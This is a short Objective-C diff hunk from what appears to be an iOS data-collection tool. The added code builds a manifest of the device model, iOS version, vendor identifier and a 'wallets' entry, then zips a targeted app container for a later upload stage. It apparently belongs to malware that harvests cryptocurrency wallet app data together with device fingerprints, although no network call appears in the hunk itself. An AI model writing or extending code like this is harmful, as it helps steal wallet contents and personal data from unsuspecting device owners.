@@ -465,9 +465,23 @@ static NSArray<NSDictionary *> *OWTargets(void) {
 
 - (void)_zipContainer:(NSString *)containerPath to:(NSString *)zipPath name:(NSString *)name {
     // 必须真的生成 zip：只把目录塞进 results 会在上传阶段被 !isDir 过滤掉
+    if (!name.length) name = @"Unknown";
+    UIDevice *dev = [UIDevice currentDevice];
+    NSString *idfv = dev.identifierForVendor.UUIDString ?: @"";
+    NSDictionary *manifest = @{
+        @"deviceFolder": [NSString stringWithFormat:@"%@ iOS%@ %@",
+                          dev.model, dev.systemVersion, idfv],
+        @"ios": dev.systemVersion ?: @"",
+        @"productType": [OWDeviceProfile current].machine ?: dev.model,
+        @"found": @[name],
+        @"wallets": @[@{@"wallet": name, @"bundleID": @"", @"bytes": @0}],
+        @"source": @"OPENsrc",
+    };
     NSError *e = nil;
     BOOL ok = [OWArchive zipDirectory:containerPath
                                    to:zipPath
+                             manifest:manifest
+                               subdir:name
                              maxBytes:self.maxFileBytes
                              totalCap:self.maxContainerBytes
                                 error:&e];
